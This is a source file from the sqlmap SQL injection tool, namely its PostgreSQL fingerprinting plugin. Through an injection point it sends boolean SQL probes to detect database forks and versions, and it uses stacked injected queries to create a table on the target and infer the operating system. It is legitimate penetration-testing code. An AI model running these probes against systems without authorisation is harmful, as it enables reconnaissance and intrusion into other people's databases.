#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import Backend
from lib.core.common import Format
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import FORK
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import OS
from lib.core.session import setDbms
from lib.core.settings import PGSQL_ALIASES
from lib.request import inject
from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self, DBMS.PGSQL)

    def getFingerprint(self):
        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)

        if fork is None:
            if inject.checkBooleanExpression("VERSION() LIKE '%CockroachDB%'"):
                fork = FORK.COCKROACHDB
            elif inject.checkBooleanExpression("VERSION() LIKE '%Redshift%'"):      # Reference: https://dataedo.com/kb/query/amazon-redshift/check-server-version
                fork = FORK.REDSHIFT
            elif inject.checkBooleanExpression("VERSION() LIKE '%Greenplum%'"):     # Reference: http://www.sqldbpros.com/wordpress/wp-content/uploads/2014/08/what-version-of-greenplum.png
                fork = FORK.GREENPLUM
            elif inject.checkBooleanExpression("VERSION() LIKE '%Yellowbrick%'"):   # Reference: https://www.yellowbrick.com/docs/3.3/ybd_sqlref/version.html
                fork = FORK.YELLOWBRICK
            elif inject.checkBooleanExpression("VERSION() LIKE '%EnterpriseDB%'"):  # Reference: https://www.enterprisedb.com/edb-docs/d/edb-postgres-advanced-server/user-guides/user-guide/11/EDB_Postgres_Advanced_Server_Guide.1.087.html
                fork = FORK.ENTERPRISEDB
            elif inject.checkBooleanExpression("VERSION() LIKE '%YB-%'"):           # Reference: https://github.com/yugabyte/yugabyte-db/issues/2447#issue-499562926
                fork = FORK.YUGABYTEDB
            elif inject.checkBooleanExpression("AURORA_VERSION() LIKE '%'"):        # Reference: https://aws.amazon.com/premiumsupport/knowledge-center/aurora-version-number/
                fork = FORK.AURORA
            else:
                fork = ""

            hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)

        value = ""
        wsOsFp = Format.getOs("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = Format.getOs("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += DBMS.PGSQL
            if fork:
                value += " (%s fork)" % fork
            return value

        actVer = Format.getDbms()
        blank = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp.get("dbmsVersion")

            if banVer:
                banVer = Format.getDbms([banVer])
                value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = Format.getErrorParsedDBMSes()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        if fork:
            value += "\n%sfork fingerprint: %s" % (blank, fork)

        return value

    def checkDbms(self):
        """
        References for fingerprint:

        * https://www.postgresql.org/docs/current/static/release.html
        """

        if not conf.extensiveFp and Backend.isDbmsWithin(PGSQL_ALIASES):
            setDbms(DBMS.PGSQL)

            self.getBanner()

            return True

        infoMsg = "testing %s" % DBMS.PGSQL
        logger.info(infoMsg)

        # NOTE: Vertica works too without the CONVERT_TO()
        result = inject.checkBooleanExpression("CONVERT_TO('[RANDSTR]', QUOTE_IDENT(NULL)) IS NULL")

        if result:
            infoMsg = "confirming %s" % DBMS.PGSQL
            logger.info(infoMsg)

            result = inject.checkBooleanExpression("COALESCE([RANDNUM], NULL)=[RANDNUM]")

            if not result:
                warnMsg = "the back-end DBMS is not %s" % DBMS.PGSQL
                logger.warn(warnMsg)

                return False

            setDbms(DBMS.PGSQL)

            self.getBanner()

            if not conf.extensiveFp:
                return True

            infoMsg = "actively fingerprinting %s" % DBMS.PGSQL
            logger.info(infoMsg)

            if inject.checkBooleanExpression("GEN_RANDOM_UUID() IS NOT NULL"):
                Backend.setVersion(">= 13.0")
            elif inject.checkBooleanExpression("SINH(0)=0"):
                Backend.setVersion(">= 12.0")
            elif inject.checkBooleanExpression("SHA256(NULL) IS NULL"):
                Backend.setVersion(">= 11.0")
            elif inject.checkBooleanExpression("XMLTABLE(NULL) IS NULL"):
                Backend.setVersionList([">= 10.0", "< 11.0"])
            elif inject.checkBooleanExpression("SIND(0)=0"):
                Backend.setVersionList([">= 9.6.0", "< 10.0"])
            elif inject.checkBooleanExpression("TO_JSONB(1) IS NOT NULL"):
                Backend.setVersionList([">= 9.5.0", "< 9.6.0"])
            elif inject.checkBooleanExpression("JSON_TYPEOF(NULL) IS NULL"):
                Backend.setVersionList([">= 9.4.0", "< 9.5.0"])
            elif inject.checkBooleanExpression("ARRAY_REPLACE(NULL,1,1) IS NULL"):
                Backend.setVersionList([">= 9.3.0", "< 9.4.0"])
            elif inject.checkBooleanExpression("ROW_TO_JSON(NULL) IS NULL"):
                Backend.setVersionList([">= 9.2.0", "< 9.3.0"])
            elif inject.checkBooleanExpression("REVERSE('sqlmap')='pamlqs'"):
                Backend.setVersionList([">= 9.1.0", "< 9.2.0"])
            elif inject.checkBooleanExpression("LENGTH(TO_CHAR(1,'EEEE'))>0"):
                Backend.setVersionList([">= 9.0.0", "< 9.1.0"])
            elif inject.checkBooleanExpression("2=(SELECT DIV(6,3))"):
                Backend.setVersionList([">= 8.4.0", "< 9.0.0"])
            elif inject.checkBooleanExpression("EXTRACT(ISODOW FROM CURRENT_TIMESTAMP)<8"):
                Backend.setVersionList([">= 8.3.0", "< 8.4.0"])
            elif inject.checkBooleanExpression("ISFINITE(TRANSACTION_TIMESTAMP())"):
                Backend.setVersionList([">= 8.2.0", "< 8.3.0"])
            elif inject.checkBooleanExpression("9=(SELECT GREATEST(5,9,1))"):
                Backend.setVersionList([">= 8.1.0", "< 8.2.0"])
            elif inject.checkBooleanExpression("3=(SELECT WIDTH_BUCKET(5.35,0.024,10.06,5))"):
                Backend.setVersionList([">= 8.0.0", "< 8.1.0"])
            elif inject.checkBooleanExpression("'d'=(SELECT SUBSTR(MD5('sqlmap'),1,1))"):
                Backend.setVersionList([">= 7.4.0", "< 8.0.0"])
            elif inject.checkBooleanExpression("'p'=(SELECT SUBSTR(CURRENT_SCHEMA(),1,1))"):
                Backend.setVersionList([">= 7.3.0", "< 7.4.0"])
            elif inject.checkBooleanExpression("8=(SELECT BIT_LENGTH(1))"):
                Backend.setVersionList([">= 7.2.0", "< 7.3.0"])
            elif inject.checkBooleanExpression("'a'=(SELECT SUBSTR(QUOTE_LITERAL('a'),2,1))"):
                Backend.setVersionList([">= 7.1.0", "< 7.2.0"])
            elif inject.checkBooleanExpression("8=(SELECT POW(2,3))"):
                Backend.setVersionList([">= 7.0.0", "< 7.1.0"])
            elif inject.checkBooleanExpression("'a'=(SELECT MAX('a'))"):
                Backend.setVersionList([">= 6.5.0", "< 6.5.3"])
            elif inject.checkBooleanExpression("VERSION()=VERSION()"):
                Backend.setVersionList([">= 6.4.0", "< 6.5.0"])
            elif inject.checkBooleanExpression("2=(SELECT SUBSTR(CURRENT_DATE,1,1))"):
                Backend.setVersionList([">= 6.3.0", "< 6.4.0"])
            elif inject.checkBooleanExpression("'s'=(SELECT SUBSTRING('sqlmap',1,1))"):
                Backend.setVersionList([">= 6.2.0", "< 6.3.0"])
            else:
                Backend.setVersion("< 6.2.0")

            return True
        else:
            warnMsg = "the back-end DBMS is not %s" % DBMS.PGSQL
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if Backend.getOs():
            return

        infoMsg = "fingerprinting the back-end DBMS operating system"
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "character(10000)")
        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "VERSION()"))

        # Windows executables should always have ' Visual C++' or ' mingw'
        # patterns within the banner
        osWindows = (" Visual C++", "mingw")

        for osPattern in osWindows:
            query = "(SELECT LENGTH(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%" + osPattern + "%')>0"

            if inject.checkBooleanExpression(query):
                Backend.setOs(OS.WINDOWS)

                break

        if Backend.getOs() is None:
            Backend.setOs(OS.LINUX)

        infoMsg = "the back-end DBMS operating system is %s" % Backend.getOs()
        logger.info(infoMsg)

        self.cleanup(onlyFileTbl=True)
